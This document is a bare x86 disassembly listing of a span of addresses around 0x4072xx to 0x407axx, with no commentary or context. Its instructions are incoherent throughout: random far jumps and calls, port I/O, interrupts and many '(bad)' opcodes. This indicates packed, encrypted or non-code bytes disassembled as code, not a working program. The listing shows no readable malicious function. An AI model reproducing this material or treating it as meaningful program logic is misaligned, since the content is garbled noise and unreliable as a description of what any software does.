  40729b:	aam    0xd5
  40729d:	ret    
  40729e:	mov    ecx,0x24e16a57
  4072a3:	je     0x407225
  4072a5:	or     al,0x71
  4072a7:	loope  0x4072c9
  4072a9:	or     DWORD PTR [ecx+0x5f],ecx
  4072ac:	pop    es
  4072ad:	int    0x4f
  4072af:	test   DWORD PTR [edx+0x72],edi
  4072b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072b3:	in     eax,dx
  4072b4:	or     eax,0x6ca2101c
  4072b9:	in     al,0x85
  4072bb:	push   edi
  4072bc:	cmp    esi,DWORD PTR [esp+eax*2+0x74e9545e]
  4072c3:	sbb    eax,0x5021285e
  4072c8:	mov    edi,0xd06d2750
  4072cd:	dec    esp
  4072ce:	mov    dh,0x3e
  4072d0:	ficom  DWORD PTR [edx-0xf92d5fc]
  4072d6:	popf   
  4072d7:	sbb    ebx,DWORD PTR [ebx-0x80]
  4072da:	jnp    0x4072e5
  4072dc:	call   0x1dae:0x5eb8806e
  4072e3:	jle    0x4072e1
  4072e5:	into   
  4072e6:	cmp    ecx,DWORD PTR [ebp+0x1adc1840]
  4072ec:	mov    ds:0x85f3a17b,al
  4072f1:	es add edx,0x6f944023
  4072f8:	pop    ss
  4072f9:	push   ss
  4072fa:	fldcw  WORD PTR [ecx]
  4072fc:	jp     0x40731e
  4072fe:	cmp    ebx,eax
  407300:	idiv   BYTE PTR [ecx]
  407302:	mov    ah,0x3d
  407304:	fstp   QWORD PTR [esi]
  407306:	adc    al,0x5f
  407308:	adc    edi,DWORD PTR [edx+0xe197fdc]
  40730e:	or     eax,0xb0dcb1f0
  407313:	sti    
  407314:	jnp    0x407320
  407316:	enter  0x196f,0x12
  40731a:	in     eax,0x41
  40731c:	fwait
  40731d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40731f:	xor    eax,0xf1f96ac7
  407324:	dec    ebx
  407325:	mov    bl,0x1c
  407327:	or     BYTE PTR [edi+0x3bc5318d],0x7d
  40732e:	in     al,0xcb
  407330:	or     eax,0x18b76df0
  407335:	mov    DWORD PTR [edx+0x22],esp
  407338:	je     0x407347
  40733a:	mov    dh,0xe5
  40733c:	ins    DWORD PTR es:[edi],dx
  40733d:	jne    0x4073a4
  40733f:	(bad)  
  407340:	sbb    eax,0x8c9dfd96
  407345:	mov    BYTE PTR [ebx-0x3ded47e9],0x57
  40734c:	sub    DWORD PTR [ebp-0x80],esp
  40734f:	pop    esi
  407350:	xor    edi,DWORD PTR [edx-0x728593a2]
  407356:	cmp    ebp,edi
  407358:	xchg   esi,eax
  407359:	out    0x9f,al
  40735b:	jg     0x4073ab
  40735d:	int3   
  40735e:	inc    esp
  40735f:	cs popf 
  407361:	enter  0xb664,0xd4
  407365:	mov    edi,eax
  407367:	rcl    BYTE PTR [edi+0x1c],1
  40736a:	adc    eax,0x4bec314d
  40736f:	cmp    BYTE PTR [eax],dh
  407371:	addr16 xchg esp,eax
  407373:	(bad)  
  407374:	mov    ds:0x81eb89c8,eax
  407379:	inc    esi
  40737a:	mov    ch,BYTE PTR [eax-0x7d7bc1]
  407380:	mov    ebp,0xb6ddb5ae
  407385:	cmc    
  407386:	push   esi
  407387:	xor    al,0xb0
  407389:	test   eax,0x6906c2a2
  40738e:	jmp    0x5ca3bdb4
  407393:	into   
  407394:	pop    ebp
  407395:	sar    bl,1
  407397:	sbb    DWORD PTR [esi],edx
  407399:	mov    edi,0x575bede5
  40739e:	jbe    0x407375
  4073a0:	mov    bl,0x16
  4073a2:	test   esi,ebx
  4073a4:	sbb    BYTE PTR [ecx],dh
  4073a6:	mov    dh,BYTE PTR [edi-0x39]
  4073a9:	or     edi,DWORD PTR [ebx+eax*4]
  4073ac:	jmp    0x7acb:0xcdb1f75e
  4073b3:	mov    BYTE PTR ds:0x97466280,bl
  4073b9:	add    al,BYTE PTR [esi-0x50f13e4]
  4073bf:	(bad)  
  4073c0:	mov    cl,0x85
  4073c2:	ins    DWORD PTR es:[edi],dx
  4073c3:	mov    ?,WORD PTR [ebp-0x65]
  4073c6:	inc    ecx
  4073c7:	fld    TBYTE PTR [eax+0xd]
  4073ca:	or     cl,bl
  4073cc:	loope  0x4073fd
  4073ce:	fwait
  4073cf:	stos   BYTE PTR es:[edi],al
  4073d0:	unpcklps xmm0,XMMWORD PTR [eax]
  4073d3:	cmp    DWORD PTR [edi+ebx*4],ebx
  4073d6:	ss xor al,0x94
  4073d9:	mov    ebp,0x7680ab6b
  4073de:	and    ah,al
  4073e0:	jmp    0x3c32:0x32a9f2b7
  4073e7:	mov    WORD PTR [ebx],?
  4073e9:	in     eax,dx
  4073ea:	(bad)  
  4073ed:	dec    ebp
  4073ee:	mov    dl,0x1d
  4073f0:	iret   
  4073f1:	js     0x407437
  4073f3:	pop    es
  4073f4:	add    bh,BYTE PTR [eax-0x6a85ab2a]
  4073fa:	cwde   
  4073fb:	jg     0x407439
  4073fd:	add    ecx,edi
  4073ff:	(bad)  
  407400:	js     0x4073a9
  407402:	nop
  407403:	ret    0x355f
  407406:	and    eax,0xb091cb50
  40740b:	aam    0x0
  40740d:	lods   eax,DWORD PTR ds:[esi]
  40740e:	loopne 0x4073f0
  407410:	add    BYTE PTR [esi-0x77],ah
  407413:	and    BYTE PTR [esi],ch
  407415:	jg     0x407432
  407417:	dec    ebx
  407418:	outs   dx,BYTE PTR ds:[esi]
  407419:	inc    ebx
  40741a:	int3   
  40741b:	mov    esp,0x7ca93b73
  407420:	sahf   
  407421:	jns    0x407408
  407423:	xchg   edi,eax
  407424:	mov    edi,0xee3bac78
  407429:	mov    ds:0xaa5a4280,al
  40742e:	mov    ebp,0x5639337d
  407433:	add    eax,0x884d753a
  407438:	sub    DWORD PTR [ebx],0xa3cd125b
  40743e:	out    0xba,eax
  407440:	mov    bl,0x6f
  407442:	cmp    esi,esp
  407444:	aaa    
  407445:	out    0x24,al
  407447:	call   0x8aaed389
  40744c:	(bad)  
  40744d:	adc    cl,BYTE PTR ds:[eax+0x75555013]
  407454:	stc    
  407455:	and    al,0xe0
  407457:	add    al,0x4d
  407459:	xor    eax,0xd92d2ac9
  40745e:	xchg   edi,eax
  40745f:	mov    edi,0x495a732
  407464:	mov    edx,?
  407466:	fstp   TBYTE PTR [ebx]
  407468:	and    eax,0xa70f0dea
  40746d:	scas   eax,DWORD PTR es:[edi]
  40746e:	into   
  40746f:	lods   eax,DWORD PTR ds:[esi]
  407470:	or     al,0xa0
  407472:	scas   al,BYTE PTR es:[edi]
  407473:	jbe    0x40742b
  407475:	sub    bh,BYTE PTR [esi+0x4e38d12]
  40747b:	push   cs
  40747c:	shl    DWORD PTR [edx+0x2fe9857a],0xae
  407483:	jb     0x40742d
  407485:	pop    es
  407486:	fwait
  407487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407488:	pop    esi
  407489:	js     0x4074fd
  40748b:	xchg   edx,eax
  40748c:	push   ebx
  40748d:	jbe    0x407476
  40748f:	fprem  
  407491:	test   BYTE PTR [ebx+0x48],bl
  407494:	shr    DWORD PTR [ecx],0x9c
  407497:	adc    al,0x49
  407499:	retf   0x5aec
  40749c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749d:	or     ebx,edx
  40749f:	in     al,0x1e
  4074a1:	jecxz  0x4074ae
  4074a3:	and    dh,BYTE PTR [edi]
  4074a5:	mov    BYTE PTR [ebx+0x7f],dh
  4074a8:	push   esp
  4074a9:	inc    ecx
  4074aa:	xor    ebp,eax
  4074ac:	mov    ecx,0xab906f93
  4074b1:	pusha  
  4074b2:	dec    ebx
  4074b3:	lods   al,BYTE PTR ds:[esi]
  4074b4:	push   ebx
  4074b5:	jmp    0x3d22:0x433de16c
  4074bc:	and    edi,DWORD PTR [edi]
  4074be:	scas   al,BYTE PTR es:[edi]
  4074bf:	fdiv   QWORD PTR [edi]
  4074c1:	dec    edx
  4074c2:	jbe    0x4074d3
  4074c4:	push   esp
  4074c5:	jb     0x4074b5
  4074c7:	sbb    dl,BYTE PTR [eax+eax*1-0x777799ba]
  4074ce:	push   ebp
  4074cf:	add    ecx,ecx
  4074d1:	cmp    ecx,DWORD PTR [eax-0x25]
  4074d4:	inc    edx
  4074d5:	jl     0x4074fd
  4074d7:	mov    WORD PTR [ecx-0x27],ss
  4074da:	inc    ebx
  4074db:	retf   
  4074dc:	fdivp  st(3),st
  4074de:	in     al,0x5
  4074e0:	or     DWORD PTR [ecx],esi
  4074e2:	out    0xa2,al
  4074e4:	inc    edx
  4074e5:	cmp    al,BYTE PTR ss:[ecx+0x32]
  4074e9:	jbe    0x407524
  4074eb:	jmp    0xaa1f133a
  4074f0:	mov    DWORD PTR [edi-0x3b18091c],eax
  4074f6:	push   ecx
  4074f7:	popa   
  4074f8:	dec    esi
  4074f9:	aam    0x4b
  4074fb:	cmp    al,0x7a
  4074fd:	mov    edi,0xbd00d30c
  407502:	imul   DWORD PTR [edx-0x70]
  407505:	mov    esp,0xb1a6b58b
  40750a:	icebp  
  40750b:	jecxz  0x407567
  40750d:	call   0xbe89:0x4ce6eca2
  407514:	mov    ds:0xcf7dfaa5,al
  407519:	mov    cl,0xcb
  40751b:	fist   DWORD PTR [edi-0x3b5a1c1c]
  407521:	dec    ecx
  407522:	add    al,0x88
  407524:	repz inc esp
  407526:	sbb    eax,0x5dd7fc20
  40752b:	imul   edi,DWORD PTR [ebx+0x278a03c5],0x57a68745
  407535:	loope  0x407557
  407537:	lods   eax,DWORD PTR ds:[esi]
  407538:	push   ss
  407539:	inc    ebp
  40753a:	jbe    0x4075b7
  40753c:	pusha  
  40753d:	xlat   BYTE PTR ds:[ebx]
  40753e:	mov    esi,0x64fdf425
  407543:	pop    ecx
  407544:	les    esp,FWORD PTR [edx]
  407546:	ins    BYTE PTR es:[edi],dx
  407547:	jno    0x4074cb
  407549:	sahf   
  40754a:	sub    eax,0x430c8b0b
  40754f:	sub    ah,al
  407551:	mov    esp,0x3e20439d
  407556:	jne    0x40750d
  407558:	(bad)  
  407559:	aad    0xd5
  40755b:	(bad)  
  40755c:	aad    0xc9
  40755e:	out    0xbe,al
  407560:	sti    
  407561:	in     eax,dx
  407562:	dec    edx
  407563:	inc    esp
  407564:	mov    dh,0xe8
  407566:	xchg   edx,eax
  407567:	jo     0x40752f
  407569:	repnz pop esp
  40756b:	int    0x24
  40756d:	not    BYTE PTR [esi]
  40756f:	and    eax,0xe0d5a8d
  407574:	xor    edx,eax
  407576:	adc    BYTE PTR [eax],0xcd
  407579:	scas   al,BYTE PTR es:[edi]
  40757a:	out    dx,al
  40757b:	imul   eax,DWORD PTR [ebp-0x52],0x5f
  40757f:	sbb    al,0xd9
  407581:	iret   
  407582:	pop    edx
  407583:	stos   BYTE PTR es:[edi],al
  407584:	jecxz  0x407550
  407586:	jmp    0x4075bd
  407588:	xchg   esp,eax
  407589:	jmp    0xdef0765c
  40758e:	push   esp
  40758f:	push   ss
  407590:	push   ebp
  407591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407592:	jne    0x4075d3
  407594:	cmp    eax,0x572a08ff
  407599:	ja     0x4075c9
  40759b:	cdq    
  40759c:	or     DWORD PTR [esi+0x31],edx
  40759f:	mov    al,ds:0x98e13f3c
  4075a4:	daa    
  4075a5:	nop
  4075a6:	jbe    0x4075a3
  4075a8:	add    BYTE PTR [edx-0x4d],ah
  4075ab:	push   ecx
  4075ac:	dec    eax
  4075ad:	in     eax,0x91
  4075af:	mov    eax,ds:0x60be13cd
  4075b4:	xchg   ecx,eax
  4075b5:	jo     0x4075bf
  4075b7:	or     BYTE PTR ds:0xcfe9074b,ch
  4075bd:	arpl   WORD PTR [esi],di
  4075bf:	and    al,0x8c
  4075c1:	push   ebp
  4075c2:	xor    edx,DWORD PTR [edi+edx*1+0xd]
  4075c6:	jbe    0x407556
  4075c8:	sti    
  4075c9:	cmovge ebx,ebx
  4075cc:	inc    edi
  4075cd:	sub    bh,BYTE PTR [esi+ecx*4]
  4075d0:	pop    esi
  4075d1:	sbb    DWORD PTR [edx+ecx*2+0x7a],edi
  4075d5:	sub    al,0xd
  4075d7:	mov    edx,0xcf2ee364
  4075dc:	xchg   ebx,eax
  4075dd:	(bad)  
  4075de:	xor    DWORD PTR [esi-0x54fd762b],ebx
  4075e4:	jmp    0x8a632af8
  4075e9:	jne    0x4075ac
  4075eb:	and    edx,edx
  4075ed:	xor    al,BYTE PTR [esi]
  4075ef:	xor    al,0xf1
  4075f1:	pusha  
  4075f2:	jp     0x407595
  4075f4:	push   cs
  4075f5:	and    BYTE PTR [esi],al
  4075f7:	pop    ds
  4075f8:	out    0xcb,al
  4075fa:	jmp    0xd87e:0xd0be9ea3
  407601:	jnp    0x407588
  407603:	push   eax
  407604:	and    dh,dl
  407606:	mov    ebx,0xedee8fd2
  40760b:	adc    DWORD PTR [esi+0x2193d4e7],edx
  407611:	das    
  407612:	xchg   esi,eax
  407613:	(bad)  
  407614:	xor    eax,0x20fad316
  407619:	cmp    eax,0xb0086544
  40761e:	cmp    esi,DWORD PTR ds:0x4c24f9b7
  407624:	lds    edi,FWORD PTR [esi]
  407626:	sbb    DWORD PTR [esi],ecx
  407628:	pop    edi
  407629:	popf   
  40762a:	jge    0x4075d0
  40762c:	pop    edi
  40762d:	dec    ecx
  40762e:	or     edx,DWORD PTR [edi+0x46]
  407631:	sbb    eax,0xa8629b60
  407636:	lds    ecx,FWORD PTR [esi-0x3c]
  407639:	inc    eax
  40763a:	sbb    eax,0x55a865b3
  40763f:	pop    edx
  407640:	push   ebx
  407641:	fist   WORD PTR [ebp+edi*8+0x6b]
  407645:	inc    edi
  407646:	stc    
  407647:	xchg   esi,eax
  407648:	fidivr DWORD PTR [ecx]
  40764a:	xor    BYTE PTR [ebp-0x28],al
  40764d:	jmp    0x6c16:0x124e7114
  407654:	mov    bh,0xb0
  407656:	(bad)  
  407657:	fcom   QWORD PTR [esi]
  407659:	loope  0x407627
  40765b:	jo     0x4076c5
  40765d:	retf   
  40765e:	xor    edx,DWORD PTR [edx-0x7839336a]
  407664:	add    DWORD PTR [edx+0x43cc487f],ebp
  40766a:	cmp    DWORD PTR [ebp+0x73],edi
  40766d:	mov    eax,0xb6b0d1b3
  407672:	clc    
  407673:	jo     0x407660
  407675:	rcl    BYTE PTR [ebx+0x7361816a],0x87
  40767c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40767d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40767e:	(bad)  
  40767f:	mov    cl,0xbb
  407681:	mov    ebx,0xcfc4f0a0
  407686:	mov    DWORD PTR [edx-0x5342412f],esi
  40768c:	push   ecx
  40768d:	xchg   edx,eax
  40768e:	rcl    DWORD PTR [bx+di],cl
  407691:	push   es
  407692:	retf   0xa8ea
  407695:	push   eax
  407696:	stos   BYTE PTR es:[edi],al
  407697:	inc    edx
  407698:	outs   dx,DWORD PTR ds:[esi]
  407699:	shr    DWORD PTR [edi+0x2c16584d],cl
  40769f:	hlt    
  4076a0:	add    eax,0x115b83f5
  4076a5:	jmp    0x1aa9:0x36dea7d6
  4076ac:	fnstcw WORD PTR [eax+0x281f845d]
  4076b2:	adc    BYTE PTR [ecx+0x36a837c4],bh
  4076b8:	ins    BYTE PTR es:[edi],dx
  4076b9:	stc    
  4076ba:	pop    esi
  4076bb:	(bad)  
  4076bc:	mov    ch,0x88
  4076be:	and    al,0x6c
  4076c0:	ds rol esp,cl
  4076c3:	jb     0x40766a
  4076c5:	test   BYTE PTR [edx],ch
  4076c7:	dec    esi
  4076c8:	aam    0x28
  4076ca:	retf   0x6827
  4076cd:	div    BYTE PTR [ecx+0x2731a0f1]
  4076d3:	or     al,BYTE PTR [ebx-0x45a9db52]
  4076d9:	mov    ebp,0xaec24ae5
  4076de:	ja     0x40766f
  4076e0:	gs loopne 0x40774a
  4076e3:	je     0x407762
  4076e5:	jo     0x40771f
  4076e7:	mov    esi,0xdd2dada3
  4076ec:	pop    edx
  4076ed:	aam    0xb7
  4076ef:	mov    ebp,0x7d345013
  4076f4:	push   eax
  4076f5:	adc    al,0x2e
  4076f7:	loope  0x4076a8
  4076f9:	mov    BYTE PTR [ecx+ecx*8],bl
  4076fc:	pusha  
  4076fd:	shr    dl,cl
  4076ff:	shl    BYTE PTR [ecx+0x26b3f8d],cl
  407705:	cmc    
  407706:	or     DWORD PTR [ebx],edi
  407708:	loop   0x40777b
  40770a:	retf   
  40770b:	ret    
  40770c:	push   esi
  40770d:	(bad)  
  40770e:	mov    ds:0x59ff5beb,eax
  407713:	sbb    bl,BYTE PTR [edi-0x3c]
  407716:	lds    ebx,FWORD PTR [ebx-0x60]
  407719:	pop    edi
  40771a:	mov    edi,0xc126dfc5
  40771f:	cmp    eax,0x78f70951
  407724:	pop    ds
  407725:	(bad)  
  407726:	cmc    
  407727:	pop    ds
  407728:	(bad)  
  407729:	cmp    dh,al
  40772b:	sbb    dl,bl
  40772d:	jecxz  0x4076dc
  40772f:	and    cl,bh
  407731:	push   ebp
  407732:	xor    esi,esi
  407734:	dec    ebp
  407735:	jge    0x407755
  407737:	xor    al,0xcc
  407739:	retf   0x9b78
  40773c:	pop    edx
  40773d:	bswap  esi
  40773f:	jb     0x4076c1
  407741:	fisttp DWORD PTR [eax+esi*8-0x6d]
  407745:	or     ebp,0x605563f3
  40774b:	js     0x40776f
  40774d:	dec    edx
  40774e:	ja     0x4076d6
  407750:	cvtps2pd xmm7,QWORD PTR [edi+0x50]
  407754:	lea    ecx,[edx+0x1c]
  407757:	cmp    eax,0x4541702e
  40775c:	jle    0x4076f5
  40775e:	or     edi,esi
  407760:	repz lds eax,FWORD PTR [esi]
  407763:	cli    
  407764:	dec    edi
  407765:	das    
  407766:	jnp    0x407747
  407768:	push   edi
  407769:	stos   DWORD PTR es:[edi],eax
  40776a:	push   cs
  40776b:	xchg   edx,eax
  40776c:	mov    ebp,0xaa63b6fb
  407771:	in     al,dx
  407772:	rol    DWORD PTR [ebx],cl
  407774:	retf   0xe499
  407777:	rol    BYTE PTR [esi+ebx*1+0x4d03893],1
  40777e:	dec    eax
  40777f:	fnsave fs:[edi-0x5e0d8854]
  407786:	push   ecx
  407787:	leave  
  407788:	pop    esi
  407789:	stos   DWORD PTR es:[edi],eax
  40778a:	fidivr DWORD PTR [esi+0x1b]
  40778d:	sar    BYTE PTR [ecx-0x6d],cl
  407790:	xchg   ecx,eax
  407791:	dec    eax
  407792:	ret    
  407793:	repz sub eax,0x344ae7a7
  407799:	mov    al,ds:0x33eb35d7
  40779e:	enter  0x8d8e,0x83
  4077a2:	test   DWORD PTR [edi-0x80],edi
  4077a5:	inc    edx
  4077a6:	mov    eax,0x46726c0a
  4077ab:	push   edi
  4077ac:	cdq    
  4077ad:	sahf   
  4077ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077af:	inc    esp
  4077b0:	(bad)  
  4077b1:	jmp    0x40781a
  4077b3:	fwait
  4077b4:	cmp    eax,edx
  4077b6:	shl    bl,0x6b
  4077b9:	mov    edi,0x5cb6a45c
  4077be:	shl    BYTE PTR [esi-0x72],0xc4
  4077c2:	ins    DWORD PTR es:[edi],dx
  4077c3:	add    al,0x6e
  4077c5:	cmc    
  4077c6:	push   ds
  4077c7:	or     BYTE PTR [ebp+0x4196d20c],dh
  4077cd:	lods   al,BYTE PTR ds:[esi]
  4077ce:	loope  0x40778d
  4077d0:	stc    
  4077d1:	rol    esp,cl
  4077d3:	dec    edx
  4077d4:	sub    esi,eax
  4077d6:	push   ds
  4077d7:	je     0x40784f
  4077d9:	sub    cl,0x60
  4077dc:	std    
  4077dd:	mov    al,BYTE PTR [ebx+0x293086bb]
  4077e3:	faddp  st(1),st
  4077e5:	push   ebx
  4077e6:	fisttp WORD PTR [eax+0x69]
  4077e9:	fadd   DWORD PTR [edi]
  4077eb:	sub    DWORD PTR [ecx+0x20],esi
  4077ee:	sub    ah,BYTE PTR ds:0x95efd693
  4077f4:	jmp    0x984e7da5
  4077f9:	add    eax,0x7c47163e
  4077fe:	pop    es
  4077ff:	fidiv  WORD PTR [edx-0x51]
  407802:	cmp    DWORD PTR [eax],edi
  407804:	nop
  407805:	adc    BYTE PTR [ebx+0x71a27cae],cl
  40780b:	adc    cl,BYTE PTR [eax+ecx*8+0x4880050c]
  407812:	push   0xffffffb9
  407814:	jp     0x4077c9
  407816:	daa    
  407817:	jle    0x4077e1
  407819:	jbe    0x40782d
  40781b:	outs   dx,DWORD PTR ds:[esi]
  40781c:	xlat   BYTE PTR ds:[ebx]
  40781d:	cmp    DWORD PTR [eax],ebp
  40781f:	cdq    
  407820:	(bad)  
  407821:	loopne 0x40782c
  407823:	clc    
  407824:	jecxz  0x4077aa
  407826:	mov    ah,0x4b
  407828:	jnp    0x407895
  40782a:	imul   edx,DWORD PTR [edi],0xfffffff5
  40782d:	mov    esi,0x4f6dfd03
  407832:	jl     0x4077f3
  407834:	mov    dl,0xee
  407836:	sbb    bl,BYTE PTR [eax-0x26f77971]
  40783c:	and    al,0x21
  40783e:	ds stos BYTE PTR es:[edi],al
  407840:	mov    dl,0x6f
  407842:	mov    DWORD PTR [edi-0x26],esi
  407845:	stos   DWORD PTR es:[edi],eax
  407846:	jge    0x4077d1
  407848:	imul   ebx,DWORD PTR [esi*8-0x61c16a7b],0xbe5f81d6
  407853:	mov    al,0x34
  407855:	pop    es
  407856:	add    BYTE PTR [eax-0x1a],ch
  407859:	and    BYTE PTR [ecx],bh
  40785b:	mov    ebp,0xbd3467e3
  407860:	xchg   edx,eax
  407861:	and    BYTE PTR [esi+0x38316642],bh
  407867:	inc    ebx
  407868:	mov    eax,0x2d75ae1a
  40786d:	fs adc DWORD PTR ds:[ecx+ecx*2-0x1d],ebp
  407873:	test   DWORD PTR [edx+0x3e],ebp
  407876:	je     0x407854
  407878:	jp     0x40787e
  40787a:	mov    WORD PTR [ebp-0x751bbaa8],?
  407880:	push   0xffffff98
  407882:	lds    ebx,FWORD PTR [ebx]
  407884:	sub    edi,DWORD PTR [edx-0x21]
  407887:	fld    DWORD PTR [ecx+edx*2+0x3e]
  40788b:	fs aam 0x51
  40788e:	dec    edx
  40788f:	leave  
  407890:	jge    0x40789e
  407892:	gs pop eax
  407894:	outs   dx,BYTE PTR ds:[esi]
  407895:	ja     0x40784b
  407897:	add    al,0xba
  407899:	mov    dl,0xd3
  40789b:	int3   
  40789c:	xchg   edi,eax
  40789d:	icebp  
  40789e:	add    ah,bl
  4078a0:	out    dx,eax
  4078a1:	lods   eax,DWORD PTR ss:[esi]
  4078a3:	adc    BYTE PTR [ebx+0x4a],bh
  4078a6:	add    al,0x3b
  4078a8:	cmp    bl,0xc0
  4078ab:	mov    al,0xff
  4078ad:	xor    eax,0x145984c
  4078b2:	xor    BYTE PTR [ecx-0x39915780],al
  4078b8:	retf   
  4078b9:	xor    BYTE PTR [ebx+0x51],dl
  4078bc:	int    0x71
  4078be:	lock mov al,0x7b
  4078c1:	ja     0x407911
  4078c3:	popf   
  4078c4:	push   esp
  4078c5:	repnz push esp
  4078c7:	stos   DWORD PTR es:[edi],eax
  4078c8:	pushf  
  4078c9:	adc    al,0xd8
  4078cb:	adc    ebx,DWORD PTR [edi]
  4078cd:	data16 mov bh,0x11
  4078d0:	fcomp  DWORD PTR [ebx+0x29198f93]
  4078d6:	pop    DWORD PTR [eax-0x77]
  4078d9:	xchg   ebp,eax
  4078da:	jb     0x4078e7
  4078dc:	pop    esi
  4078dd:	add    DWORD PTR [eax+0x5508546],esi
  4078e3:	xor    DWORD PTR [ebp-0x21],edi
  4078e6:	test   eax,0xbf3e6653
  4078eb:	or     DWORD PTR [eax-0x2a8af312],eax
  4078f1:	mov    ch,0x2f
  4078f3:	sbb    eax,0xba71de51
  4078f8:	or     al,0xe9
  4078fa:	mov    edx,0xfb808238
  4078ff:	dec    esp
  407900:	mov    ecx,ebp
  407902:	push   ebx
  407903:	xor    BYTE PTR [edi-0x827bed8],bh
  407909:	add    esi,edx
  40790b:	mov    dl,0xed
  40790d:	outs   dx,BYTE PTR ds:[esi]
  40790e:	ss xchg ebp,eax
  407910:	and    al,0x23
  407912:	icebp  
  407913:	sbb    eax,DWORD PTR [edx-0x7185e5c8]
  407919:	add    ebp,DWORD PTR [eax-0x2563c953]
  40791f:	jb     0x4078be
  407921:	jl     0x4078a8
  407923:	pop    eax
  407924:	inc    eax
  407926:	addr16 adc eax,0x22c542d7
  40792c:	sar    al,1
  40792e:	add    eax,0x1fdfd06c
  407933:	and    DWORD PTR [ecx-0x5e],esi
  407936:	dec    esi
  407937:	ret    
  407938:	lea    ebx,[edi+edi*1+0x100581a9]
  40793f:	cdq    
  407940:	mov    dh,0xe2
  407942:	frstor [esi-0x4eeac8d2]
  407948:	cmp    al,bl
  40794a:	xor    ebx,edx
  40794c:	xchg   ebp,eax
  40794d:	jl     0x4078f4
  40794f:	adc    dh,BYTE PTR [edi+0x6e]
  407952:	std    
  407953:	pop    ss
  407954:	fsubr  st(1),st
  407956:	int3   
  407957:	in     al,0x3c
  407959:	and    DWORD PTR [ebp-0x43d3b1ef],ecx
  40795f:	mov    edx,0xafd418d3
  407964:	xlat   BYTE PTR ds:[ebx]
  407965:	jmp    0x407979
  407967:	jne    0x407939
  407969:	fldenv [ebp-0x42]
  40796c:	and    al,0x8
  40796e:	xchg   ebx,eax
  40796f:	repz mov ah,0x6e
  407972:	or     eax,0x74f02b88
  407977:	div    bl
  407979:	jno    0x40791a
  40797b:	lahf   
  40797c:	mov    ?,WORD PTR [ebp+ebx*2-0x137e6143]
  407983:	push   DWORD PTR [esi-0x7b2bbe1a]
  407989:	ins    BYTE PTR es:[edi],dx
  40798a:	and    eax,0x5fd8e292
  40798f:	xor    edi,DWORD PTR [esi-0x2428d9dd]
  407995:	mov    al,ds:0x64f29af0
  40799a:	repnz mov ebp,0x2d4d7d6e
  4079a0:	jno    0x4079ce
  4079a2:	sahf   
  4079a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079a4:	and    ch,BYTE PTR [ecx]
  4079a6:	push   0x37a3eead
  4079ab:	cmp    ebp,ebx
  4079ad:	sub    BYTE PTR [ebx],0x85
  4079b0:	sbb    ah,BYTE PTR [esi-0x3]
  4079b3:	adc    al,0xf3
  4079b5:	sub    DWORD PTR [ebx+0x16],eax
  4079b8:	jbe    0x40798c
  4079ba:	add    DWORD PTR [edi],edx
  4079bc:	retf   0x5fb
  4079bf:	vmread DWORD PTR [edx+eiz*8],edx
  4079c3:	add    ecx,edi
  4079c5:	test   bl,al
  4079c7:	imul   eax,edi,0x15d4284b
  4079cd:	icebp  
  4079ce:	xor    eax,0x9a86c252
  4079d3:	ror    bh,cl
  4079d5:	test   al,0xc2
  4079d7:	sbb    esi,ecx
  4079d9:	mov    ebp,0x21178c0c
  4079de:	push   es
  4079df:	(bad)
  4079e2:	adc    bl,BYTE PTR [ecx-0x21f5e684]
  4079e8:	mov    dl,0x2c
  4079ea:	mov    eax,ds:0x18aad944
  4079ef:	ss sub al,0xfc
  4079f2:	push   esi
  4079f3:	and    eax,0x242e7fdf
  4079f8:	or     dl,BYTE PTR [ecx]
  4079fa:	push   ss
  4079fb:	xchg   DWORD PTR [edi+0x3f],edi
  4079fe:	fwait
  4079ff:	mov    ah,0x81
  407a01:	adc    BYTE PTR [edi-0x21242063],bl
  407a07:	xchg   ebx,eax
  407a08:	inc    eax
  407a09:	aad    0xb4
  407a0b:	out    0x51,eax
  407a0d:	test   eax,0xb8de98fd
  407a12:	pop    edi
  407a13:	jmp    0x402ada7
  407a18:	sbb    ch,BYTE PTR [ebx+0x37d5a861]
  407a1e:	sbb    DWORD PTR [esi],ebx
  407a20:	inc    DWORD PTR [ecx+0x60d5e5a9]
  407a26:	rol    DWORD PTR [edx-0x4e1dce87],0x49
  407a2d:	clc    
  407a2e:	pop    edi
  407a2f:	add    BYTE PTR [edx],ch
  407a31:	mov    eax,0x455dbb59
  407a36:	nop
  407a37:	test   DWORD PTR [esi],ebp
  407a39:	idiv   DWORD PTR [esi+edx*1+0x75]
  407a3d:	xchg   ecx,eax
  407a3e:	sbb    BYTE PTR [edx],al
  407a40:	neg    DWORD PTR [eax+eiz*8+0x35402cfa]
  407a47:	xchg   DWORD PTR [esi],edx
  407a49:	push   ss
  407a4a:	sbb    ah,ch
  407a4c:	test   al,0x66
  407a4e:	daa    
  407a4f:	add    eax,0xcebbd18e
  407a54:	xor    dl,BYTE PTR [ebp-0x30432b1f]
  407a5a:	jg     0x4079e7
  407a5c:	retf   0xc3ec
  407a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a60:	fstp   TBYTE PTR [eax]
  407a62:	lock xchg ebx,eax
  407a64:	push   0xef9ba830
  407a69:	repnz mov bh,0xc1
  407a6c:	and    eax,0xc172e52f
  407a71:	ror    BYTE PTR [esi+0x511783f6],cl
  407a77:	cmp    eax,0x9094c4bb
  407a7c:	jnp    0x407ab9
  407a7e:	jns    0x407a67
  407a80:	push   eax
  407a81:	test   BYTE PTR [ecx-0x1e5016c7],0xd9
  407a88:	pop    es
  407a89:	push   edi
  407a8a:	enter  0xd5b6,0xa9
  407a8e:	xchg   ebx,eax
  407a8f:	inc    edi
  407a90:	int    0xa2
  407a92:	in     eax,0x4d
  407a94:	adc    cl,al
  407a96:	mov    dl,0x99
  407a98:	add    BYTE PTR [edx],bh
  407a9a:	and    cl,dh
  407a9c:	xchg   DWORD PTR [ebx+0x36],eax
  407a9f:	pop    eax
  407aa0:	mov    dl,0x93
  407aa2:	pop    edx
  407aa3:	push   ebx
  407aa4:	out    0xb1,al
  407aa6:	dec    ebx
  407aa7:	jge    0x407ac5
  407aa9:	repz idiv ch
  407aac:	aad    0xde
  407aae:	fxam   
